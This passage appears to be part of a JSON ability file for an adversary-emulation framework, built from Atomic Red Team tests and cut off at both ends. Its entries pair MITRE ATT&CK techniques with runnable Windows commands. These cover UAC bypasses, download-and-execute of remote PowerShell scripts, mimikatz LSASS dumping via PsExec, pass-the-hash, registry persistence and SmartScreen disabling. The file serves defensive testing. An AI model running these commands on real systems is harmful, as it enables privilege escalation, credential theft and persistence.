                    "cleanup": "taskkill /F /IM calculator.exe >nul 2>&1",
                    "command": "set DOTNET_STARTUP_HOOKS=80410d_preloader && dotnet -h > nul && echo.",
                    "payloads": [
                        "80410d_preloader"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "e6aa3e0695f748b47ce54a4bb4e24a06",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "5e0427f03faf554046c6a29864087b49": {
        "description": "An adversary modifies group policy settings\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1484.001",
            "name": "Domain Policy Modification: Group Policy Modification"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -Force -ErrorAction Ignore ; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -Force -ErrorAction Ignore; Remove-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force -ErrorAction Ignore",
                    "command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeDC -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffsetDC -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTime -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name GroupPolicyRefreshTimeOffset -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name EnableSmartScreen -PropertyType DWord -Value 0 -Force; New-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\System\" -Name ShellSmartScreenLevel -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5e0427f03faf554046c6a29864087b49",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2a8b67014a39f1689a0541be5308b53f": {
        "description": "The following Atomic Test will create a GlobalFlag key under Image File Execution Options, also a SilentProcessExit Key with ReportingMode and MonitorProcess values. This test is similar to a recent CanaryToken that will generate an EventCode 3000 in the Application log when a command, whoami.exe for example, is executed.\nUpon running Whoami.exe, a command shell will spawn and start calc.exe based on the MonitorProcess value. \nUpon successful execution, powershell will modify the registry and spawn calc.exe. An event 3000 will generate in the Application log.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.012",
            "name": "Event Triggered Execution: Image File Execution Options Injection"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "$SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe\" ; Remove-Item $SilentProcessExit -force; $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe\"; Remove-Item $registryPath -force",
                    "command": "$Name = \"GlobalFlag\"; $Value = \"512\"; $registryPath = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\whoami.exe\"; New-Item -Path $registryPath -Force; New-ItemProperty -Path $registryPath -Name $Name -Value $Value -PropertyType DWord -Force; $Name = \"ReportingMode\"; $Value = \"1\"; $SilentProcessExit = \"HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\whoami.exe\"; New-Item -Path $SilentProcessExit -Force; New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType DWord -Force ; $Name = \"MonitorProcess\"; $Value = \"cmd.exe /c calc.exe\"; New-ItemProperty -Path $SilentProcessExit -Name $Name -Value $Value -PropertyType String -Force; Start-Process whoami.exe",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2a8b67014a39f1689a0541be5308b53f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1bb96a80fd7968839ead470953ffb738": {
        "description": "UAC bypass using ccmstp technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1bb96a80fd7968839ead470953ffb738",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "fae19d138e13891b093fdcc2bd0ccf50": {
        "description": "This test simulates an adversary leveraging bitsadmin.exe to schedule a BITS transferand execute a payload in multiple steps.\nNote that in this test, the file executed is not the one downloaded. The downloading of a random file is simply the trigger for getting bitsdamin to run an executable.\nThis has the interesting side effect of causing the executable (e.g. notepad) to run with an Initiating Process of \"svchost.exe\" and an Initiating Process Command Line of \"svchost.exe -k netsvcs -p -s BITS\"\nThis job will remain in the BITS queue until complete or for up to 90 days by default if not removed.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1197",
            "name": "BITS Jobs"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del %temp%\\bitsadmin3_flag.ps1 >nul 2>&1",
                    "command": "bitsadmin.exe /create AtomicBITS && bitsadmin.exe /addfile AtomicBITS https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md %temp%\\bitsadmin3_flag.ps1 && bitsadmin.exe /setnotifycmdline AtomicBITS C:\\Windows\\system32\\notepad.exe NULL && bitsadmin.exe /resume AtomicBITS && ping -n 5 127.0.0.1 >nul 2>&1 && bitsadmin.exe /complete AtomicBITS",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "fae19d138e13891b093fdcc2bd0ccf50",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ba8ddc38c7c6ced12fecc0d695c5e57c": {
        "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Unregister-ScheduledTask -TaskName \"AtomicTask\" -confirm:$false >$null 2>&1",
                    "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTask -InputObject $object",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ba8ddc38c7c6ced12fecc0d695c5e57c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "824ec334619ca634d13aff308a9a064c": {
        "description": "UAC bypass using Magic technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "824ec334619ca634d13aff308a9a064c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "690255f4e6c935ec3e76fa357fc499cc": {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent: Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore",
                    "command": "\"%temp%\\uacme\\31 Akagi64.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "690255f4e6c935ec3e76fa357fc499cc",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "e538e0ff74962aaf1dbd08baa5c7853f": {
        "description": "Colibri leverages PowerShell in a unique way to maintain persistence after a reboot. Depending on the Windows version, Colibri drops its copy in %APPDATA%\\Local\\Microsoft\\WindowsApps and \nnames it Get-Variable.exe for Windows 10 and above.\nhttps://blog.malwarebytes.com/threat-intelligence/2022/04/colibri-loader-combines-task-scheduler-and-powershell-in-clever-persistence-technique/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.008",
            "name": "Hijack Execution Flow: Path Interception by Search Order Hijacking"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" -ErrorAction Ignore; Stop-Process -Name \"calculator\"",
                    "command": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:\"$env:localappdata\\Microsoft\\WindowsApps\\Get-Variable.exe\" \"PathToAtomicsFolder\\T1574.008\\bin\\calc.cs\"; Powershell -noprofile",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e538e0ff74962aaf1dbd08baa5c7853f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "6aaef62bec6838502a36c73e7b728921": {
        "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privelages\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item \"HKCU:\\software\\classes\\mscfile\" -force -Recurse -ErrorAction Ignore",
                    "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\eventvwr.msc\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6aaef62bec6838502a36c73e7b728921",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "64ccf7cd4358a0540ab51c8015c1b744": {
        "description": "Windows Management Instrumentation(WMI) objects contain system information which helps to detect virtualization. This test will get the model and manufacturer of the machine to determine if it is a virtual machine, such as through VMware or VirtualBox. \n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1497.001",
            "name": "Virtualization/Sandbox Evasion: System Checks"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$Manufacturer = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Manufacturer\"; $Model = Get-WmiObject -Class Win32_ComputerSystem | select-object -expandproperty \"Model\"; if((($Manufacturer.ToLower() -eq \"microsoft corporation\") -and ($Model.ToLower().contains(\"virtual\"))) -or ($Manufacturer.ToLower().contains(\"vmware\")) -or ($Model.ToLower() -eq \"virtualbox\")) {write-host \"Virtualization environment detected!\"} else {write-host \"No virtualization environment detected!\"}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "64ccf7cd4358a0540ab51c8015c1b744",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "3688b79543e271e7389e76377aa65fcd": {
        "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "powershell Stop-Process -Name cmd -Force -ErrorAction Ignore && powershell Stop-Process -Name mmc -Force -ErrorAction Ignore",
                    "command": "\"%temp%\\uacme\\61 Akagi64.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3688b79543e271e7389e76377aa65fcd",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "5db2884b6ca3ab932848f295a3896dc0": {
        "description": "Run an exe on user logon or system startup.  Upon execution, success messages will be displayed for the two scheduled tasks. To view\nthe tasks, open the Task Scheduler and look in the Active Tasks pane.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "schtasks /delete /tn \"T1053_005_OnLogon\" /f >nul 2>&1 && schtasks /delete /tn \"T1053_005_OnStartup\" /f >nul 2>&1",
                    "command": "schtasks /create /tn \"T1053_005_OnLogon\" /sc onlogon /tr \"cmd.exe /c calc.exe\" && schtasks /create /tn \"T1053_005_OnStartup\" /sc onstart /ru system /tr \"cmd.exe /c calc.exe\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "5db2884b6ca3ab932848f295a3896dc0",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "b6e5c895c6709fe289352ee23f062229": {
        "description": "This test to simulate shortcut modification and then execute. example shortcut (*.lnk , .url) strings check with powershell;\ngci -path \"C:\\Users\" -recurse -include *.url -ea SilentlyContinue | Select-String -Pattern \"exe\" | FL.\nUpon execution, calc.exe will be launched.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.009",
            "name": "Boot or Logon Autostart Execution: Shortcut Modification"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del -f %temp%\\T1547.009_modified_shortcut.url >nul 2>&1",
                    "command": "echo [InternetShortcut] > %temp%\\T1547.009_modified_shortcut.url && echo URL=C:\\windows\\system32\\calc.exe >> %temp%\\T1547.009_modified_shortcut.url && %temp%\\T1547.009_modified_shortcut.url",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b6e5c895c6709fe289352ee23f062229",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f76013db08bdef5b66f24c93a44c678c": {
        "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privelages\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg.exe delete hkcu\\software\\classes\\mscfile /f >nul 2>&1",
                    "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f && cmd.exe /c eventvwr.msc",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f76013db08bdef5b66f24c93a44c678c",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "4b71ebb2f6f6a01235ba240fa40ce978": {
        "description": "RunOnce Key Persistence via PowerShell\nUpon successful execution, a new entry will be added to the runonce item in the registry.\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.001",
            "name": "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-ItemProperty -Path HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce -Name \"NextRun\" -Force -ErrorAction Ignore",
                    "command": "$RunOnceKey = \"HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\"; set-itemproperty $RunOnceKey \"NextRun\" 'powershell.exe \"IEX (New-Object Net.WebClient).DownloadString(`\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`\")\"'",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4b71ebb2f6f6a01235ba240fa40ce978",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "c240b81112d5652659a74aadd862256b": {
        "description": "Service registry permissions weakness check and then which can lead to privilege escalation with ImagePath. eg.\nreg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\#{weak_service_name}\" /v ImagePath /d \"C:\\temp\\AtomicRedteam.exe\"\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1574.011",
            "name": "Hijack Execution Flow: Services Registry Permissions Weakness"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\* |FL; get-acl REGISTRY::HKLM\\SYSTEM\\CurrentControlSet\\Services\\weakservicename |FL",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "c240b81112d5652659a74aadd862256b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "597a256401dfa1181b9624acf3128786": {
        "description": "command execute with crackmapexec\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1550.002",
            "name": "Use Alternate Authentication Material: Pass the Hash"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\CrackMapExecWin\\crackmapexec.exe %userdnsdomain% -u Administrator -H cc36cf7a8514893efccd3324464tkg1a -x whoami",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "597a256401dfa1181b9624acf3128786",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "3571488e9343065a62e25f45fe8848f0": {
        "description": "Upon execution, check the \"C:\\Windows\\apppatch\\Custom\\\" folder for the new shim database\n\nhttps://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.011",
            "name": "Event Triggered Execution: Application Shimming"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb -ErrorAction Ignore; Remove-Item C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb -ErrorAction Ignore",
                    "command": "Copy-Item df9e44_T1546.011CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\T1546.011CompatDatabase.sdb; Copy-Item df9e44_T1546.011CompatDatabase.sdb C:\\Windows\\apppatch\\Custom\\Custom64\\T1546.011CompatDatabase.sdb",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "df9e44_T1546.011CompatDatabase.sdb"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "3571488e9343065a62e25f45fe8848f0",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "cd5baf218626b4ed4fbc9725551f2863": {
        "description": "Use mimikatz to remotely (via psexec) dump LSASS process content for RID 500 via code injection (new thread).\nEspecially useful against domain controllers in Active Directory environments.\nIt must be executed in the context of a user who is privileged on remote `machine`.\n\nThe effect of `/inject` is explained in <https://blog.3or.de/mimikatz-deep-dive-on-lsadumplsa-patch-and-inject.html>\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1055",
            "name": "Process Injection"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "C:\\PSTools\\PsExec.exe /accepteula \\\\DC1 -c %tmp%\\mimikatz\\x64\\mimikatz.exe \"lsadump::lsa /inject /id:500\" \"exit\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "cd5baf218626b4ed4fbc9725551f2863",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f27b37f253617c39ac010d2ee1238b7e": {
        "description": "UAC bypass using DiskCleanup technique via function of WinPwn",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f27b37f253617c39ac010d2ee1238b7e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "46a56290d3447a83cadcff710d8e005d": {
        "description": "Leverage Global Flags Settings\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1546.012",
            "name": "Event Triggered Execution: Image File Execution Options Injection"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\calc.exe\" /v Debugger /f >nul 2>&1",
                    "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\"",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "46a56290d3447a83cadcff710d8e005d",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "6881a4589710d53f0c146e91db513f01": {
        "description": "Uses the built-in Windows packet capture\nAfter execution you should find a file named trace.etl and trace.cab in the temp directory",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1040",
            "name": "Network Sniffing"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "netsh trace stop >nul 2>&1 && TIMEOUT /T 5 >nul 2>&1 && del %temp%\\trace.etl >nul 2>&1 && del %temp%\\trace.cab >nul 2>&1",
                    "command": "netsh trace start capture=yes tracefile=%temp%\\trace.etl maxsize=10",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "6881a4589710d53f0c146e91db513f01",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "67fe3c9df14ec9c65b9fdeb5fcc62bb6": {
        "description": "Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1547.003",
            "name": "Time Providers"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "net stop w32time; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Windows\\SYSTEM32\\w32time.DLL\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"0\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"0\" /f; rm -force C:\\Users\\Public\\AtomicTest.dll; net start w32time",
                    "command": "net stop w32time; Copy-Item d97818_AtomicTest.dll C:\\Users\\Public\\AtomicTest.dll; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f; reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f; net start w32time",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "d97818_AtomicTest.dll"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "67fe3c9df14ec9c65b9fdeb5fcc62bb6",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "4150ef18184112953ae5742a3f8de64e": {
        "description": "Create a scheduled task with an action and modify the action to do something else. The initial idea is to showcase Microsoft Windows TaskScheduler Operational log modification of an action on a Task already registered. \nIt will first be created to spawn cmd.exe, but modified to run notepad.exe.\n\nUpon successful execution, powershell.exe will create a scheduled task and modify the action. \n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1053.005",
            "name": "Scheduled Task/Job: Scheduled Task"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Unregister-ScheduledTask -TaskName \"AtomicTaskModifed\" -confirm:$false >$null 2>&1",
                    "command": "$Action = New-ScheduledTaskAction -Execute \"cmd.exe\"; $Trigger = New-ScheduledTaskTrigger -AtLogon; $User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest; $Set = New-ScheduledTaskSettingsSet; $object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set; Register-ScheduledTask AtomicTaskModifed -InputObject $object; $NewAction = New-ScheduledTaskAction -Execute \"Notepad.exe\"; Set-ScheduledTask \"AtomicTaskModifed\" -Action $NewAction",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "4150ef18184112953ae5742a3f8de64e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "09f12d8d4611f88f40e0be1a8c036027": {
        "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n",
        "tactic": "multiple",
        "technique": {
            "attack_id": "T1548.002",
            "name": "Abuse Elevation Control Mechanism: Bypass User Access Control"
        },
        "platforms": {
